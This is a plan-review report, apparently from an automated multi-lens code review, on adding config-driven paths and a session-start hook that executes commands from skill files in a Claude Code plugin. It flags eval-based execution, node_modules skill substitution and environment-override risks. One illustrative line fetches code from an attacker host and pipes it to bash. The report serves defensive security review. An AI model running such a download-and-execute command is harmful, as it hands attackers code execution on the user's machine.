---
date: "2026-05-08T23:45:00+01:00"
type: plan-review
skill: review-plan
target: "meta/plans/2026-05-08-0052-documents-locator-config-driven-paths.md"
review_number: 1
verdict: COMMENT
lenses: [architecture, code-quality, test-coverage, correctness, security, standards, compatibility, safety]
review_pass: 2
status: complete
---

## Plan Review: 0052 — Documents-Locator Config-Driven Paths

**Verdict:** REVISE

Phases 1–3 are mechanically sound additions to a well-designed config infrastructure and follow the existing `config-defaults.sh → config-read-path.sh → config-read-value.sh` pattern cleanly. The TDD discipline is thorough and the invariant tracking (31-skill count, DIR_COUNT) is careful. Phase 4 (`skills-detect.sh`) concentrates the plan's most serious risks: the `eval`-based bang-line execution creates an arbitrary code execution surface active at every session start, the skill resolver traverses a `node_modules` subtree creating a supply-chain substitution path, and a missing update to snapshot tests in `test-config.sh` makes the Phase 1 success criterion unachievable as written. These three critical issues, plus several major gaps in the hook's safety posture and test coverage, require the plan to be revised before implementation begins.

### Cross-Cutting Themes

- **`eval` in `_process_bang_lines`** (flagged by: Security 🔴, Architecture 🟡, Code Quality 🟡, Safety 🟡) — The most widely flagged concern across the review. `eval "$cmd"` on content extracted from SKILL.md files is the single highest-risk decision in the plan. It appears in four independent lens analyses with overlapping-but-distinct concerns: code execution, architectural extensibility hazard, bash pattern precedent, and partial-output corruption. A consistent allowlist-based approach or `bash -c` with path validation would address all four angles simultaneously.

- **Unconditional injection scope** (flagged by: Architecture 🟡, Compatibility 🟡, Safety 🔵) — Every session start will inject the Configured Paths block regardless of which agent is active, with no deduplication if multiple agents share a skill. All three lenses agree the unconditional path should be treated as temporary architectural debt, not a permanent design, with a follow-on work item to scope injection when agent identity becomes available.

- **`DOC_KEYS` duplicates path vocabulary** (flagged by: Architecture 🟡, Code Quality 🟡) — Both lenses independently identify that the hardcoded `DOC_KEYS` array in `config-read-all-paths.sh` creates a second maintenance site for the document-discovery key subset. Adding a new path type to `config-defaults.sh` still requires a manual edit to `DOC_KEYS`, partially undermining the auto-discovery requirement. An exclusion-list derivation from `PATH_KEYS` would eliminate the parallel list.

- **`_find_skill_by_name` scope issues** (flagged by: Security 🔴, Architecture 🔵, Correctness 🔵, Compatibility 🔵) — The `grep -rl` traversal finds `name: <skill>` matches in SKILL.md body text (not only frontmatter) and traverses `node_modules`. Four lenses flag this, with Security identifying it as critical via supply-chain risk.

### Tradeoff Analysis

- **`eval` vs `bash -c` with allowlist**: `eval` is simpler and directly mirrors the native bang-preprocessor behaviour, but it erases the boundary between passive skill content and executable hook code. `bash -c` with a `${PLUGIN_ROOT}/scripts/` path prefix check adds ~4 lines but closes the supply-chain and future-skill-author hazard entirely. The tradeoff favours the allowlist for a hook that runs unconditionally at every session start.

- **Unconditional injection vs targeted injection**: Targeted injection (only inject skills for the active agent) is architecturally clean but depends on whether Claude Code exposes agent identity in the `SessionStart` payload — an open question. The discovery spike is the right way to resolve this. The tradeoff is temporary context noise for all sessions (unconditional) vs an unknown implementation cost (targeted). The plan's fallback logic is sound; it needs to be more explicitly temporary.

---

### Findings

#### Critical

- 🔴 **Security**: `eval` of regex-extracted SKILL.md content enables arbitrary code execution
  **Location**: Phase 4: `_process_bang_lines` function in `hooks/skills-detect.sh`
  Any SKILL.md file under `${CLAUDE_PLUGIN_ROOT}/skills/` containing a crafted bang line (e.g. `` !`curl https://attacker.example | bash` ``) is executed verbatim at every `SessionStart`. Because the hook runs unconditionally, this surface is always active — the user never needs to invoke the affected skill.

- 🔴 **Security**: `_find_skill_by_name` traverses `node_modules`, enabling supply-chain skill substitution
  **Location**: Phase 4: `_find_skill_by_name` function in `hooks/skills-detect.sh`
  `grep -rl "^name: ${skill_name}$" "$PLUGIN_ROOT/skills"` traverses the full `skills/` tree, which includes `skills/visualisation/visualise/frontend/node_modules/` containing SKILL.md files with `name:` frontmatter. A compromised npm package can ship a SKILL.md with `name: paths` to substitute its bang commands for the real skill's — combined with the `eval` finding, this achieves code execution via dependency supply chain.

- 🔴 **Compatibility**: PATH_KEYS and PATH_DEFAULTS snapshot tests not updated for new `global` entry
  **Location**: Phase 1: `config-defaults.sh` changes
  `scripts/test-config.sh` lines 2441–2453 contain snapshot tests hardcoding both the array length (`15`) and exact space-joined content strings ending with `paths.design_gaps` / `meta/design-gaps`. Adding the sixteenth `paths.global`/`meta/global` entry causes both tests to fail, making Phase 1's own success criterion ("Full test suite green") unachievable as written.

#### Major

- 🟡 **Safety**: `eval` runs in hook shell without `set -euo pipefail`; bang failures produce partial output
  **Location**: Phase 4: `skills-detect.sh` — `_process_bang_lines` function
  A bang command that writes to stdout before failing will have its partial output included in `COMBINED` and injected into `additionalContext`. The `|| true` suppresses the exit code but does not discard already-emitted output, silently degrading every session's injected context with no visible error.

- 🟡 **Safety**: Spy script removal has no checklist item in Phase 4 success criteria
  **Location**: Phase 4: Discovery Step — spy script lifecycle
  `hooks/tmp-stdin-spy.sh` and its `hooks.json` entry are mentioned in prose but absent from the Automated Verification checklist. If the discovery spike is run and the implementer moves to production hook work without completing the removal step, the spy script writes session event data to `/tmp/claude-sessionstart-spy.txt` on every session start indefinitely.

- 🟡 **Safety**: Unbounded `COMBINED` accumulation — no output-size cap on bang command output
  **Location**: Phase 4: `skills-detect.sh` — COMBINED accumulation loop
  Bang command output accumulates in `COMBINED` without a size limit. A verbose or looping bang command can fill the entire session context window with injected content, degrading session quality with no diagnostic.

- 🟡 **Security/Safety**: `CLAUDE_PLUGIN_ROOT` export can redirect bang command execution
  **Location**: Phase 4: `_process_bang_lines` — `CLAUDE_PLUGIN_ROOT` export
  The hook exports `CLAUDE_PLUGIN_ROOT="${CLAUDE_PLUGIN_ROOT:-$PLUGIN_ROOT}"`. If `CLAUDE_PLUGIN_ROOT` is already set by a compromised or crafted caller environment, bang commands containing `${CLAUDE_PLUGIN_ROOT}/scripts/...` execute scripts from the attacker-controlled path. The `:- fallback` only helps when the variable is unset; it provides no protection against a malicious value already present in the environment.

- 🟡 **Architecture+Code Quality**: `DOC_KEYS` hardcodes the document-discovery subset, creating a second vocabulary maintenance site
  **Location**: Phase 2: `config-read-all-paths.sh` — `DOC_KEYS` array
  The script sources `config-defaults.sh` (giving access to `PATH_KEYS`/`PATH_DEFAULTS`) but then defines a separate static `DOC_KEYS` array rather than deriving the document subset from `PATH_KEYS` by exclusion. Adding a new path key to `config-defaults.sh` will not cause it to appear in `config-read-all-paths.sh` output without also editing `DOC_KEYS` — an undocumented second touch-point that undermines the auto-discovery requirement.

- 🟡 **Architecture+Compatibility**: Unconditional injection injects Configured Paths into every session
  **Location**: Phase 4: unconditional injection approach
  `skills-detect.sh` injects skill content from all agents' `skills:` frontmatter into every `SessionStart` regardless of which agent is active. After Phase 5, every `codebase-locator`, `reviewer`, and top-level session receives the Configured Paths block. As more agents acquire `skills:` frontmatter, the injected context grows without a natural bound. If two agents share the same skill, the block is injected twice (no deduplication in the `COMBINED` loop).

- 🟡 **Correctness**: Hook does not implement the `disable-model-invocation` skip documented in the work item
  **Location**: Phase 4: `hooks/skills-detect.sh` — `_process_bang_lines` and `_find_skill_by_name`
  The work item (§Requirements #2) states the harness preload pipeline skips skills with `disable-model-invocation: true`. Phase 3's structural test validates the paths skill lacks this flag with the message "harness preload pipeline skips such skills". However, `skills-detect.sh` contains no code checking for this flag before processing a skill. The test documents a behavioral contract the implementation does not enforce.

- 🟡 **Compatibility**: Unknown `skills:` key in agent frontmatter may be rejected by Claude Code's native parser
  **Location**: Phase 5: `agents/documents-locator.md` frontmatter
  `skills:` is not in the documented native vocabulary for agent definitions (`name`, `description`, `tools`). Whether Claude Code's agent-definition YAML parser is strict (rejects unknown keys) or lenient (ignores them) is unknown. If strict, adding `skills: [paths]` could break every `documents-locator` invocation after Phase 5.

- 🟡 **Test Coverage**: VCS detection in fake plugin tests may resolve to the real accelerator repo root
  **Location**: Phase 4: `hooks/test-skills-detect.sh` — `setup_fake_plugin`
  `$FAKE` gets a `mkdir -p "$FAKE/.git"` inside the plugin root, but `$FAKE` itself is not the working directory during hook invocations — `$REPO` is. The `$FAKE/.git` serves no purpose and creates potential confusion. On local machines where `$TMPDIR_BASE` is not inside any VCS tree, `find_repo_root()` walks up from `$REPO` correctly; the extraneous `.git` in `$FAKE` is misleading and could mask environment-dependent failures.

- 🟡 **Test Coverage**: No automated test for config override propagation through the hook's execution path
  **Location**: Phase 4: `hooks/test-skills-detect.sh` test cases
  The Phase 4 "agent with skills: [paths]" test uses a default project with no `.accelerator/config.md`. The core value of this work item — that a configured path override flows all the way through to `additionalContext` — is only covered by Phase 5 manual verification steps, with no automated regression guard.

- 🟡 **Test Coverage**: Phase 5 has no automated tests for the agent body rewrite
  **Location**: Phase 5: Success Criteria — Automated Verification
  The four verification steps are all `grep` presence/absence checks. None verify which `meta/` references in the fallback-default list are acceptable vs. forbidden; a residual hardcoded `meta/research/codebase/` in the instructions section would pass all four checks if it appears inside the fallback block.

#### Minor

- 🔵 **Architecture+Correctness+Compatibility**: `_find_skill_by_name` matches SKILL.md body text, not only frontmatter `name:` fields
  **Location**: Phase 4: `_find_skill_by_name` in `hooks/skills-detect.sh`
  `grep -rl "^name: ${skill_name}$"` matches any line in a SKILL.md file. `skills/config/configure/SKILL.md` already contains `name: compliance` and `name: work-item-style` in its body. A future agent with `skills: [compliance]` would resolve to `configure/SKILL.md` instead of a dedicated skill.

- 🔵 **Correctness**: Script comment falsely claims VCS detection runs once; each subprocess runs it independently
  **Location**: Phase 2: `config-read-all-paths.sh` — header comment
  The comment `# Source config-common.sh once — pays VCS detection once` is incorrect. Each `config-read-value.sh` subprocess sources `config-common.sh` and triggers VCS detection independently. The parent-process sourcing has no effect on subprocess environments.

- 🔵 **Correctness+Standards**: `init.sh` step-1 item-count comment not updated from 12 to 13
  **Location**: Phase 1: `skills/config/init/scripts/init.sh`
  Line 17 reads `# Step 1: project-content directories under meta/ (12 items)`. The plan adds `global` to the arrays but does not include updating this comment to `(13 items)`.

- 🔵 **Correctness**: Multi-line YAML `skills:` syntax silently produces no injection with no error
  **Location**: Phase 4: `skills-detect.sh` — `skills_raw` extraction
  The awk extraction handles only inline-array YAML (`skills: [paths]`). Block-sequence format (`skills:\n  - paths`) produces an empty `skills_raw` and silently skips all skills for that agent. The constraint on inline-only syntax is undocumented.

- 🔵 **Test Coverage**: No test for an agent with multiple skills listed
  **Location**: Phase 4: `hooks/test-skills-detect.sh` test cases
  All test cases use a single `skills: [paths]`. The multi-skill loop accumulation code path (separator correctness, deduplication) is never exercised.

- 🔵 **Test Coverage**: Phase 1 tests don't cover `config.local.md` override precedence for the `global` key
  **Location**: Phase 1: `scripts/test-config.sh` — add failing tests first
  The two Phase 1 tests cover default-only and `config.md` override. No test asserts the last-writer-wins behaviour via `config.local.md` for the new key.

- 🔵 **Standards**: `paths/SKILL.md` frontmatter omits any non-invocable marker
  **Location**: Phase 3: `skills/config/paths/SKILL.md` content
  The skill is described as not intended for direct user invocation but carries no frontmatter signal to that effect. `disable-model-invocation: true` cannot be used (the preload pipeline skips it), but `user-invocable: false` (used by review lens and output-format skills) would convey intent consistently.

- 🔵 **Standards**: Hook test mixes raw `PASS=$((PASS + 1))` increments with `assert_*` helper calls
  **Location**: Phase 4: `hooks/test-skills-detect.sh`
  The established convention (followed by `hooks/test-migrate-discoverability.sh`) is to delegate all counter management to `assert_*` helpers exclusively. The proposed test file uses both patterns in the same file.

- 🔵 **Standards**: `hooks.json` insertion position ambiguous relative to `migrate-discoverability.sh`
  **Location**: Phase 4: `hooks/hooks.json` entry
  The plan says "after the existing `config-detect.sh` entry" but `migrate-discoverability.sh` already sits between `config-detect.sh` and the end of the `SessionStart` array. The intended position (second or fourth) is ambiguous.

- 🔵 **Safety**: Bang failures produce no stderr diagnostic; silent on legacy-layout repos
  **Location**: Phase 4: `skills-detect.sh` — `|| true` on eval
  On repos with legacy Accelerator layout, `config-read-value.sh` exits 1 via `config_assert_no_legacy_layout`. The `|| true` handles this correctly but silently; the operator gets no indication of why paths aren't resolving.

#### Suggestions

- 🔵 **Architecture+Code Quality**: `COMBINED` does not deduplicate when multiple agents reference the same skill — a `declare -A seen_skills` guard would prevent repeated injection of identical content.

- 🔵 **Code Quality**: `skills_raw` extracted via `awk '{$1=""; print}' | sed 's/^[[:space:]]*//'` — the awk field-zeroing trick is non-obvious; a comment or replacement with `config-read-value.sh` (which does the same thing for config files) would improve readability.

---

### Strengths

- ✅ Phases 1–3 are clean mechanical extensions: `global` key addition touches exactly the right files with no logic changes to the resolution loop.
- ✅ Sourcing `config-common.sh` once in `config-read-all-paths.sh` reflects the correct performance intent (even if the subprocess calls re-trigger VCS detection) — the intent is right, only the comment and implementation need updating.
- ✅ The discovery spike for `SessionStart` stdin content is correctly placed before any production hook implementation, with a defined fallback — this is exemplary pre-implementation validation.
- ✅ The 31-skill preprocessor count and `DIR_COUNT:12→13` invariants are explicitly identified and protected, reflecting detailed familiarity with the test suite.
- ✅ `jq -n --arg context` for JSON output ensures the hook's response is always injection-safe regardless of bang command output content.
- ✅ `config_extract_frontmatter`, `config_extract_body`, and `config_parse_array` reuse from `config-common.sh` avoids duplicating fragile YAML-adjacent parsing logic.
- ✅ The `[ -z "$COMBINED" ] && exit 0` short-circuit produces zero impact for the vast majority of sessions where no agent has `skills:` frontmatter.
- ✅ Phase sequencing correctly models Phase 4 as independent of Phases 1–3, and Phase 5 as dependent on both Phase 3 and Phase 4.

---

### Recommended Changes

1. **Address `eval` security and scope** (addresses: Critical eval finding, Major partial-output finding, Major CLAUDE_PLUGIN_ROOT finding, Architecture eval hazard)
   Replace `eval "$cmd"` with `bash -c "$cmd"` preceded by a path-prefix allowlist check: expand `$CLAUDE_PLUGIN_ROOT` in `$cmd`, assert the resolved command starts with `$PLUGIN_ROOT/scripts/`, reject lines that fail the check. Use the trustworthy `$PLUGIN_ROOT` (from `$BASH_SOURCE`) inside bang execution rather than the ambient `$CLAUDE_PLUGIN_ROOT`. Use `processed_line=$(bash -c "$cmd" 2>/dev/null) && printf '%s\n' "$processed_line" || true` to discard partial output on failure.

2. **Restrict `_find_skill_by_name` to plugin-own skills, excluding `node_modules`** (addresses: Critical node_modules finding, Minor body-text match)
   Add `--exclude-dir=node_modules` to the `grep -rl` invocation and limit matching to frontmatter by checking only the first block up to the closing `---`. Consider resolving by canonical path convention (`skills/<category>/<name>/SKILL.md`) to eliminate the full-tree traversal entirely.

3. **Update snapshot tests for the `global` key in Phase 1** (addresses: Critical snapshot test finding)
   Add a step in Phase 1's change list to update `EXPECTED_PATH_KEYS`, `EXPECTED_PATH_DEFAULTS`, and both `assert_eq "... length"` assertions at `scripts/test-config.sh:2441–2453` to reflect 16-entry arrays before running the test suite.

4. **Add spy script removal to success criteria** (addresses: Major spy script lifecycle)
   Add `[ ] Confirm hooks/tmp-stdin-spy.sh does not exist and hooks/hooks.json contains no reference to it` as a Phase 4 Automated Verification checklist item.

5. **Add output-size cap to `COMBINED` accumulation** (addresses: Major unbounded accumulation)
   Add a guard before the `jq` output step: if `${#COMBINED}` exceeds a threshold (e.g. 65536 bytes), replace `COMBINED` with a truncation notice rather than injecting the full output.

6. **Implement `disable-model-invocation` skip guard** (addresses: Major correctness gap)
   Add a frontmatter check in the main loop before calling `_process_bang_lines`: extract the `disable-model-invocation` key from the skill file's frontmatter and skip the skill if it is `true`.

7. **Verify Claude Code agent frontmatter tolerance of unknown keys** (addresses: Major compatibility gap)
   During the Phase 4 discovery spike, also test that adding an unknown frontmatter key to a minimal agent definition does not break invocation. Gate Phase 5 on confirming this.

8. **Add config override and multi-skill tests to Phase 4 test file** (addresses: Major test coverage gaps)
   Add a test that writes `paths: {work: custom/work-items}` to `$REPO/.accelerator/config.md` and asserts `additionalContext` contains `work: custom/work-items`. Add a test with `skills: [paths, paths]` asserting the block appears twice (or once, if deduplication is added).

9. **Fix `config-read-all-paths.sh` comment or implement single-VCS-detection** (addresses: Minor VCS detection comment)
   Either correct the comment to state "11 VCS detections, one per key" or inline the lookup from `config-common.sh` functions to achieve the single-detection design the comment claims.

10. **Derive `DOC_KEYS` from `PATH_KEYS` by exclusion** (addresses: Major DOC_KEYS duplication, optional but recommended)
    Define `EXCLUDED_KEYS=(tmp templates integrations design_inventories design_gaps)` and filter `PATH_KEYS` against this list, stripping the `paths.` prefix to produce the active `DOC_KEYS`. This removes the second maintenance site and makes the auto-discovery claim fully accurate.

---
*Review generated by /review-plan — Pass 1*

---

## Per-Lens Results

### Architecture

**Summary**: The plan is well-structured and makes good use of the existing config infrastructure. Phases 1–3 are clean mechanical extensions of a well-designed system. The main architectural concerns cluster in Phase 4: the unconditional injection of all agents' skills on every SessionStart introduces coupling with no precedent in the hook architecture, the `eval` of bang-command strings is an unacknowledged extensibility hazard, and the `DOC_KEYS` hardcoded list partially undermines the stated auto-discovery goal.

**Strengths**:
- The three-script config chain is well-designed for the global key addition — a single-file, two-line edit with no logic changes required
- Sourcing `config-common.sh` once is an explicitly acknowledged and correct performance design intent
- The harness-level skills injection uses `additionalContext` — the only established injection mechanism
- The discovery spike is correctly placed before implementation with a defined fallback path
- Phase sequencing correctly identifies Phase 4 independence and Phase 5 dependencies

**Findings**:
- Major: DOC_KEYS hardcoded list creates second path-vocabulary maintenance site (high confidence)
- Major: eval of bang-command strings is an unacknowledged extensibility hazard (high confidence)
- Major: Unconditional injection of all agents' skills couples unrelated sessions (medium confidence)
- Minor: `_find_skill_by_name` grep pattern may match non-frontmatter lines (high confidence)
- Minor: DIR_KEYS/DIR_DEFAULTS divergence perpetuated without tracking follow-on (high confidence)
- Suggestion: COMBINED does not deduplicate when multiple agents share the same skill (medium confidence)

---

### Code Quality

**Summary**: Phases 1–3 follow the existing codebase patterns cleanly with no novel abstractions. The primary code quality concerns are the `eval` usage in `skills-detect.sh` (a pattern absent from every other script in the codebase) and the `DOC_KEYS` duplication that silently drifts from `PATH_KEYS` when new doc keys are added. Both are containable but deserve explicit attention before implementation.

**Strengths**:
- Phases 1–3 are genuine one-liner additions with no new abstractions
- Single `config-common.sh` sourcing reflects correct performance intent
- `DIR_COUNT` invariant and 31-skill count are explicitly tracked
- Discovery spike correctly sequenced before production implementation
- `setup_fake_plugin` helper correctly isolates the hook under test

**Findings**:
- Major: `eval` used to execute bang-line commands with no precedent in codebase (high confidence)
- Major: `DOC_KEYS` in `config-read-all-paths.sh` duplicates knowledge already in `PATH_KEYS` (high confidence)
- Minor: `_find_skill_by_name` traverses entire `skills/` tree on every SessionStart (high confidence)
- Minor: Test helper copies real script files rather than using test doubles, creating hidden coupling (high confidence)
- Minor: COMBINED string concatenation with `$'\n'` is fragile if transcribed slightly differently (medium confidence)
- Suggestion: `skills_raw` awk+sed pipeline non-obvious; could use existing `config-read-value.sh` (medium confidence)

---

### Test Coverage

**Summary**: The plan follows strict TDD discipline throughout Phases 1–3. Phase 4 introduces a new hook test file with reasonable coverage of core scenarios, but several meaningful edge cases and failure modes are absent: the fake-plugin VCS setup is subtly incorrect, the end-to-end config override propagation is not tested automatically, Phase 5 has no automated tests for the agent body rewrite, and multi-skill accumulation is never exercised.

**Strengths**:
- Phases 1–3 follow explicit red-green TDD loops with specific grep verification commands
- Phase 2 covers both default and config-override cases, plus partial-override
- Phase 3 structural tests replicate the configure-skill exclusion pattern exactly
- The 31-skill count and DIR_COUNT invariants are explicitly protected
- Phase 4 test file uses a minimal fake plugin for correct isolation

**Findings**:
- Major: VCS detection in fake plugin tests may resolve to real accelerator repo root (high confidence)
- Major: No test for config override propagation through the hook's bang-line execution path (high confidence)
- Major: Phase 5 has no automated tests for the agent body rewrite — only grep structural checks (high confidence)
- Minor: No test for an agent with multiple skills listed (high confidence)
- Minor: Phase 1 tests don't cover `config.local.md` override for the `global` key (high confidence)
- Minor: `setup_fake_plugin` doesn't copy `config-read-path.sh`, creating fragility if implementation approach changes (medium confidence)
- Minor: No test for the no-jq fallback message format (medium confidence)

---

### Correctness

**Summary**: The plan is logically sound for its core data flows: PATH_KEYS/PATH_DEFAULTS alignment is preserved, the DIR_COUNT invariant regex correctly matches the new bang-line format, and the config resolution chain is reused correctly. Two correctness gaps stand out: the hook's `_process_bang_lines` lacks the `disable-model-invocation` skip the work item documents as a requirement, and the `config-read-all-paths.sh` comment falsely claims VCS detection runs once when it actually runs once per subprocess call.

**Strengths**:
- PATH_KEYS/PATH_DEFAULTS parallel-array invariant is correctly preserved by append-at-same-position
- DIR_COUNT invariant regex correctly matches `**Global directory**:` — the 12→13 transition is accurate
- `skills_raw` awk extraction correctly handles inline-array YAML and multi-element arrays
- `_process_bang_lines` pipe-into-subshell correctly uses process substitution for outer loop so `COMBINED` is updated in the outer shell scope
- Bang-line regex uses correct mixed quoting for `[[` =~ `]]` with literal backtick anchors

**Findings**:
- Major: Hook does not implement `disable-model-invocation` skip documented in the work item (high confidence)
- Minor: Comment claims "pays VCS detection once" but each subprocess triggers its own VCS detection (high confidence)
- Minor: `init.sh` step-1 count comment not updated from 12 to 13 (high confidence)
- Minor: `_find_skill_by_name` grep matches body text in SKILL.md, not only frontmatter (medium confidence)
- Minor: Inline-array-only YAML parsing silently drops multi-line `skills:` syntax with no error (medium confidence)

---

### Security

**Summary**: The plan introduces a new SessionStart hook that executes arbitrary shell commands extracted from SKILL.md files on disk. The central vulnerability is `eval "$cmd"` in `_process_bang_lines` where `cmd` is taken verbatim from a regex match against file content. A secondary concern is that `_find_skill_by_name` traverses a `node_modules` subtree containing SKILL.md files whose `name:` fields could collide with legitimate skill names. The plan inherits the same trust model as the existing bang-preprocessing pipeline but makes it unconditional and active at session start rather than only when a named skill is explicitly invoked.

**Strengths**:
- `eval` mirrors the trust model already present in the native bang-preprocessing pipeline — not a wholly new attack surface
- jq dependency check follows the established pattern from existing hooks
- Output is safely encoded through `jq -n --arg context` — the JSON response itself is injection-safe
- Discovery spike correctly identifies the injection scope question before committing to implementation
- Unknown skill names silently skipped — no denial-of-service from misconfigured frontmatter

**Findings**:
- Critical: `eval` of regex-extracted file content enables arbitrary code execution (high confidence)
- Critical: `_find_skill_by_name` traverses `node_modules`, enabling supply-chain skill substitution (high confidence)
- Major: Unconditional injection of all agents' skills unnecessarily expands attack surface at every SessionStart (high confidence)
- Major: Exported `CLAUDE_PLUGIN_ROOT` can be overridden by caller environment to redirect command execution (medium confidence)
- Minor: `skill_name` interpolated directly into grep pattern without sanitisation (medium confidence)
- Minor: Spy script appends session data to world-readable `/tmp` fixed path (low confidence)

---

### Standards

**Summary**: The plan follows established project conventions closely and correctly references all key invariants. Four minor gaps are present: an inline item-count comment in `init.sh` is not updated, the proposed paths SKILL.md lacks any non-invocable marker, the hook test file mixes counter-increment styles, and the `hooks.json` insertion position is ambiguous.

**Strengths**:
- `hooks.json` entry matches the established `matcher`/`type`/`command` pattern exactly
- 31-skill preprocessor count invariant correctly identified as unaffected with clear rationale
- Configure-skill exclusion test correctly identified as the pattern template for Phase 3 tests
- Single `config-common.sh` sourcing consistent with performance discipline in existing scripts
- All four update sites in `skills/config/init/SKILL.md` identified and accounted for
- Absence of `disable-model-invocation: true` from paths SKILL.md correctly justified

**Findings**:
- Minor: Inline item-count comment in `init.sh` not updated to 13 (high confidence)
- Minor: `paths/SKILL.md` omits `user-invocable: false` marker (medium confidence)
- Minor: Hook test file mixes raw `PASS/FAIL` increments with `assert_*` helper calls (high confidence)
- Minor: `hooks.json` insertion position ambiguous relative to `migrate-discoverability.sh` (medium confidence)

---

### Compatibility

**Summary**: The plan is largely additive and backward compatible. Two verified compatibility gaps exist: Phase 1 modifies PATH_KEYS/PATH_DEFAULTS but omits updating snapshot tests that hardcode both count and content, and the unconditional injection in `skills-detect.sh` injects Configured Paths into every session including non-documents-locator agents. A medium-confidence concern is whether Claude Code's native frontmatter parser rejects unknown keys in agent definitions.

**Strengths**:
- Adding `paths.global` to `config-defaults.sh` is a clean additive change — no logic changes needed
- Plan correctly avoids the inline-defaults test at `test-config.sh:2883–2911` by using `config-read-value.sh` directly
- Discovery spike correctly sequenced before production hook implementation
- 31-skill preprocessor count invariant explicitly preserved
- New SessionStart hook follows established `matcher: ""` + `type: command` pattern
- `global` path key defaults to `meta/global`, identical behaviour for unconfigured projects

**Findings**:
- Critical: PATH_KEYS and PATH_DEFAULTS snapshot tests not updated for new `global` entry (high confidence)
- Major: Unknown `skills:` key in agent frontmatter may be rejected by Claude Code's native parser (medium confidence)
- Major: Unconditional injection injects Configured Paths into every session (high confidence)
- Minor: VCS detection overhead claim inaccurate — subprocess calls each trigger VCS detection (medium confidence)
- Minor: `_find_skill_by_name` matches body text in `configure/SKILL.md` (low confidence)

---

### Safety

**Summary**: The plan introduces a new SessionStart hook that processes bang lines via `eval` and injects content into every session's context. The most significant safety concerns are: `eval` runs without `set -euo pipefail` creating a partial-output corruption path, the discovery spike spy script has no explicit removal checkpoint, and unbounded `COMBINED` accumulation has no output-size cap. The plan's existing safeguards (`|| true` on bang execution, `jq` for JSON encoding, `[ -z "$COMBINED" ] && exit 0`) are sound but leave these gaps unaddressed.

**Strengths**:
- `jq -n --arg context` ensures arbitrary string content is safely encoded — prevents JSON injection from bang output
- Bang command failures silently skipped via `|| true` — matches graceful-degradation pattern in existing hooks
- `[ -z "$COMBINED" ] && exit 0` short-circuit produces zero impact when no agent has `skills:` frontmatter
- jq dependency check follows established pattern from `config-detect.sh` and `vcs-detect.sh`
- Unknown skill names silently skipped — misconfigured frontmatter never blocks a session
- Spy script uses `timeout 2 cat` to prevent indefinite stdin hang

**Findings**:
- Major: `eval` runs without `set -euo pipefail`; bang failures can produce partial output in `COMBINED` (high confidence)
- Major: Spy script removal has no checklist item in Phase 4 success criteria (high confidence)
- Major: Unbounded `COMBINED` accumulation — no output-size cap on bang command output (medium confidence)
- Minor: All agents' skills injected unconditionally into every session (high confidence)
- Minor: Silent failure on legacy-layout repos — no stderr diagnostic when bang commands exit non-zero (medium confidence)

---

## Re-Review (Pass 2) — 2026-05-08

**Verdict:** COMMENT

### Previously Identified Issues

- 🔴 **Security**: `eval` of regex-extracted file content enables arbitrary code execution — **Resolved**: replaced with `bash -c` with a `$PLUGIN_ROOT/scripts/` allowlist check; commands outside the prefix are skipped
- 🔴 **Security**: `_find_skill_by_name` traverses `node_modules` — **Resolved**: `find` with `-not -path "*/node_modules/*"` and `head -10` frontmatter scope; `skill_name` validated to `[a-zA-Z0-9_-]+`
- 🔴 **Compatibility**: PATH_KEYS/PATH_DEFAULTS snapshot tests not updated — **Resolved**: Phase 1 now includes explicit step and success-criteria checklist item to update tests at lines 2441–2453 to 16-entry arrays
- 🟡 **Safety**: `eval` partial output risk — **Resolved**: replaced with clean capture pattern `output=$(bash -c "$resolved") && printf '%s\n' "$output" || true`
- 🟡 **Safety**: Spy script no explicit removal checkpoint — **Resolved**: two new checklist items added to Phase 4 Automated Verification
- 🟡 **Safety**: Unbounded COMBINED accumulation — **Resolved**: 64 KB cap added before `jq` output step
- 🟡 **Security**: CLAUDE_PLUGIN_ROOT can be overridden — **Resolved**: `_process_bang_lines` now substitutes `${CLAUDE_PLUGIN_ROOT}` → `$PLUGIN_ROOT` (from `BASH_SOURCE`) before execution; ambient env var no longer used for command resolution
- 🟡 **Architecture+Code Quality**: DOC_KEYS hardcoded list — **Resolved**: replaced with EXCLUDED_KEYS derivation from PATH_KEYS, making auto-discovery accurate
- 🟡 **Correctness**: `disable-model-invocation` skip not implemented — **Resolved**: guard added in main loop before calling `_process_bang_lines`
- 🟡 **Compatibility**: Unknown `skills:` key may be rejected by Claude Code parser — **Resolved**: Phase 4 Discovery Step now includes explicit gate to verify agent frontmatter tolerance before Phase 5 proceeds
- 🟡 **Test Coverage**: VCS detection in fake plugin tests — **Resolved**: `mkdir -p "$FAKE/.git"` removed; only `$REPO` carries `.git`; `setup_fake_skill` helper extracted to reduce duplication
- 🟡 **Test Coverage**: No config override propagation test — **Resolved**: new test added that writes `paths: {work: custom/work-items}` and asserts override appears in `additionalContext`
- 🟡 **Test Coverage**: Phase 5 no automated tests for agent body rewrite — **Partially resolved**: noted as a known gap; Phase 5 success criteria remain grep-based (not yet replaced with assert-based tests)
- 🔵 **Standards**: `paths/SKILL.md` omits non-invocable marker — **Resolved**: `user-invocable: false` added to frontmatter and structural test added
- 🔵 **Standards**: Hook test mixes raw PASS/FAIL increments — **Resolved**: JSON validation and missing-skill tests now use `assert_contains`/`assert_eq`
- 🔵 **Standards**: hooks.json insertion position ambiguous — **Resolved**: description now specifies "fourth (final) entry, after `migrate-discoverability.sh`"
- 🔵 **Correctness**: init.sh count comment not updated — **Resolved**: Phase 1 change list now includes updating line 17 comment from `(12 items)` to `(13 items)`
- 🔵 **Correctness**: VCS detection comment inaccurate — **Resolved**: comment corrected to state "11 VCS detections" and note the optimisation path
- 🔵 **Correctness**: Inline-array-only YAML silently drops multi-line syntax — **Partially resolved**: comment added to `skills-detect.sh` documenting the constraint; no warning emitted (acceptable for this scope)
- 🔵 **Test Coverage**: No multi-skill test — **Resolved**: two-agent test added (agent-a and agent-b both listing `[paths]`)
- 🔵 **Test Coverage**: setup_fake_plugin missing `config-read-path.sh` — **Resolved**: added to copy list

### New Issues Introduced

#### Critical

- 🔴 **Security**: `bash -c "$resolved"` executes the entire resolved string as shell code, enabling metacharacter injection
  **Location**: Phase 4: `_process_bang_lines` — `bash -c "$resolved"` invocation
